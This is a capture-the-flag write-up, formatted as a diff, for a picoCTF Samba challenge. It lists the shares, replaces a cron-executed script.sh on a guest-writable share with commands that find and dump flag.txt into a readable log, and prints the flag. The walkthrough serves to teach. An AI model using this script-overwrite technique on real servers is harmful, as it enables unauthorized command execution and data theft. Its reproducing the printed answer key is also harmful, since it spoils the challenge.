@@ -1,0 +1,107 @@
+🏁 Challenge Summary
+Goal: Retrieve the flag hidden on a restricted Samba share (secure-shares) by exploiting a misconfigured, recurring cron job. Target: dolphin-cove.picoctf.net (Port 61813 or 57152 depending on instance rotation).
+
+🛠️ Step-by-Step Walkthrough
+1. Identify Services and Shares
+First, confirm the port is open and list the available Samba shares.
+
+bash
+
+Copy
+nc -vz dolphin-cove.picoctf.net 61813
+smbclient -L //dolphin-cove.picoctf.net -p 61813 -N
+Result: You will see two shares:
+
+shares: Public access (Guest).
+secure-shares: Restricted ("internal usage only").
+2. Analyze the Public Share
+Connect to the public shares directory to find the debug script.
+
+bash
+
+Copy
+smbclient //dolphin-cove.picoctf.net -p 61813/shares -N
+Files Found:
+
+script.sh: The debug script running every minute.
+cron.log: The log file that captures the script's output.
+Download the files to inspect them locally:
+
+bash
+
+Copy
+get script.sh
+get cron.log
+cat script.sh
+cat cron.log
+Observation: cron.log shows "Health Check" messages. The script runs every minute.
+
+3. The Exploit: Overwrite the Script
+The challenge hint says: "A suspicious script is running every minute." Since you can write to the shares directory via smbclient, you can replace script.sh with a malicious script.
+
+Strategy:
+
+Phase 1 (Discovery): Change the script to find the location of flag.txt.
+
+bash
+
+Copy
+nano script.sh
+# Content:
+#!/bin/bash
+find / -name "flag.txt" 2>/dev/null >> /challenge/shares/cron.log
+Save the file and upload it back to the server:
+
+bash
+
+Copy
+put script.sh
+Wait: Wait 60 seconds for the cron job to run.
+
+Check Results: Download cron.log again.
+
+bash
+
+Copy
+get cron.log
+cat cron.log
+Result: The log will now contain the path to the flag (e.g., /challenge/secure-shares/flag.txt).
+
+4. Retrieve the Flag
+Now that you know the path, overwrite script.sh again to dump the flag's content into the log.
+
+Modify script.sh locally:
+
+bash
+
+Copy
+nano script.sh
+# Content:
+#!/bin/bash
+cat /challenge/secure-shares/flag.txt >> /challenge/shares/cron.log
+Upload the new script:
+
+bash
+
+Copy
+put script.sh
+Wait 60 seconds again, then download the log.
+
+bash
+
+Copy
+get cron.log
+cat cron.log
+Output:
+
+text
+
+Copy
+picoCTF{5mb_pr1nter_5h4re5_r3v3r53_4c0ffa48}
+🏆 Flag
+picoCTF{5mb_pr1nter_5h4re5_r3v3r53_4c0ffa48}
+
+🔑 Key Takeaways
+Cron Job Exploitation: If you can modify a script that runs periodically, you can execute arbitrary commands.
+Side-Channel via Logs: If you can't directly read a file on the server, you can often exfiltrate data by appending it to a file you can read (like cron.log).
+SMB Writing: Many CTF challenges allow writing to shares that are "public," enabling this type of file manipulation.
